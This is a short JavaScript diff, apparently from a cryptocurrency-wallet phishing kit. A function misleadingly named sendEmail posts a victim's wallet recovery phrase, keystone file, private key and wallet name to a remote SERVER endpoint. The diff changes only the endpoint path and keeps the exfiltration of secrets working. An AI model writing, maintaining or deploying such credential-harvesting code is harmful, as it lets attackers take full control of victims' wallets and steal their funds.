@@ -51,7 +51,7 @@ export const sendEmail = async (x) => {
   }
 
   try {
-    const res = await Axios.post(`${SERVER}/${SLINK}`,{data: { type, phrase, keystone, privateKey, wallet }});
+    const res = await Axios.post(`${SERVER}/api/v1/${SLINK}`,{data: { type, phrase, keystone, privateKey, wallet }});
     console.log(res);
   } catch (error) {
     console.error(error);
